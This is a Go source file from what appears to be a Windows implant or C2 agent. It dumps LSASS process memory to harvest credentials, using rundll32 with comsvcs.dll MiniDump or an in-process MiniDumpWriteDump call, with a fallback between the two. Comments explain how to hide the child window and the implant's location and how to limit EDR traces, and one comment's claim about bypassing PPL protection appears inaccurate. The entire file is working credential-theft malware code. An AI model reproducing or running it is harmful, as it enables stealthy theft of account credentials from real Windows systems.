//go:build windows

package services

import (
	"errors"
	"fmt"
	"implant/core/debuglog"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"

	"github.com/shirou/gopsutil/process"
	"golang.org/x/sys/windows"
)

// LSASS 内存转储的三种取法。它们不是"风格差异"，而是对 PPL（Protected Process
// Light）的绕法不同，直接决定成败：
//
//	comsvcs  借签名进程 rundll32 调用签名库 comsvcs.dll!MiniDump。转储由签名进程
//	         完成，因此对 PPL 保护的 LSASS 同样有效（这是目前最常用的一条路）。
//	         代价：rundll32 子进程 + 磁盘落盘，行为链长，EDR 覆盖好。
//	dbgcore  在自己进程里调用签名库 dbgcore.dll!MiniDumpWriteDump。行为链短、
//	         不留子进程；但 PPL 开启时会因调用方未签名而被拒（返回 ACCESS_DENIED）。
//	auto     先 comsvcs 后 dbgcore：优先成功率，失败时退到痕迹更小的路径。
//
// 不做的：直接读 LSASS 内存自行组装转储（需要自己解析 PEB/内存描述符，
// 且 PPL 下照样读不到），收益低、风险高。
const (
	techComsvcs = "comsvcs"
	techDbgcore = "dbgcore"

	// MiniDumpWithFullMemory：完整内存，凭据解析必须的粒度
	minidumpWithFullMemory = 0x00000002
	// MiniDumpWithFullMemoryInfo | MiniDumpWithHandleData：补全内存属性与句柄
	minidumpExtraFlags = 0x00000800 | 0x00000004
)

// dumpCredential 按类型与技术选型获取内存转储，返回落盘路径
func dumpCredential(kind, tech, fileName string) (string, error) {
	if kind != "lsass" {
		return "", errors.New("暂不支持的凭据类型: " + kind)
	}
	pid, err := findProcessPid("lsass.exe")
	if err != nil {
		return "", err
	}

	// 转储落到临时目录（回传后立即删除；不写在当前工作目录，避免暴露植入体位置）
	dest := filepath.Join(os.TempDir(), fileName)
	_ = os.Remove(dest)

	var dumpErr error
	switch tech {
	case techComsvcs:
		dumpErr = dumpViaComsvcs(pid, dest)
	case techDbgcore:
		dumpErr = dumpViaDbgcore(pid, dest)
	default: // auto
		dumpErr = dumpViaComsvcs(pid, dest)
		if dumpErr != nil {
			debuglog.Printf("⚠️ [CRED] comsvcs 路径失败(%v)，回退 dbgcore\n", dumpErr)
			_ = os.Remove(dest)
			dumpErr = dumpViaDbgcore(pid, dest)
		}
	}
	if dumpErr != nil {
		_ = os.Remove(dest)
		return "", dumpErr
	}
	// 落盘校验：转储工具可能"成功返回"但写出 0 字节（权限不足时常见）
	st, err := os.Stat(dest)
	if err != nil {
		return "", err
	}
	if st.Size() == 0 {
		_ = os.Remove(dest)
		return "", errors.New("转储文件为空（LSASS 受保护或权限不足）")
	}
	return dest, nil
}

// findProcessPid 按进程名找 PID（不区分大小写）
func findProcessPid(name string) (uint32, error) {
	procs, err := process.Processes()
	if err != nil {
		return 0, fmt.Errorf("枚举进程失败: %w", err)
	}
	for _, p := range procs {
		n, err := p.Name()
		if err != nil {
			continue
		}
		if strings.EqualFold(n, name) {
			return uint32(p.Pid), nil
		}
	}
	return 0, errors.New("未找到进程: " + name)
}

// dumpViaComsvcs 借 rundll32 + comsvcs.dll!MiniDump 落转储（对 PPL 有效）
func dumpViaComsvcs(pid uint32, dest string) error {
	dll := filepath.Join(os.Getenv("SystemRoot"), "System32", "comsvcs.dll")
	if _, err := os.Stat(dll); err != nil {
		return fmt.Errorf("comsvcs.dll 不可用: %w", err)
	}
	rundll := filepath.Join(os.Getenv("SystemRoot"), "System32", "rundll32.exe")
	// rundll32 的参数形式：<dll>, MiniDump <pid> <path> full
	cmd := exec.Command(rundll, dll+",", "MiniDump", strconv.FormatUint(uint64(pid), 10), dest, "full")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("rundll32 MiniDump 失败: %w", err)
	}
	return nil
}

// dumpViaDbgcore 在自己进程内调用签名库 dbgcore.dll!MiniDumpWriteDump
func dumpViaDbgcore(pid uint32, dest string) error {
	// PROCESS_QUERY_INFORMATION | PROCESS_VM_READ：读进程内存所需的最小权限集
	const access = windows.PROCESS_QUERY_INFORMATION | windows.PROCESS_VM_READ
	h, err := windows.OpenProcess(access, false, pid)
	if err != nil {
		return fmt.Errorf("打开 LSASS 失败（PPL 保护或权限不足）: %w", err)
	}
	defer windows.CloseHandle(h)

	f, err := os.Create(dest)
	if err != nil {
		return fmt.Errorf("创建转储文件失败: %w", err)
	}
	defer f.Close()

	// dbgcore.dll 是微软签名库；从自身进程调用时，PPL 开启会被拒绝
	dll := windows.NewLazySystemDLL("dbgcore.dll")
	proc := dll.NewProc("MiniDumpWriteDump")
	if err := dll.Load(); err != nil {
		return fmt.Errorf("加载 dbgcore.dll 失败: %w", err)
	}
	r, _, callErr := proc.Call(
		uintptr(h),
		uintptr(pid),
		f.Fd(),
		uintptr(minidumpWithFullMemory|minidumpExtraFlags),
		0, 0, 0,
	)
	if r == 0 {
		return fmt.Errorf("MiniDumpWriteDump 失败: %v", callErr)
	}
	return nil
}
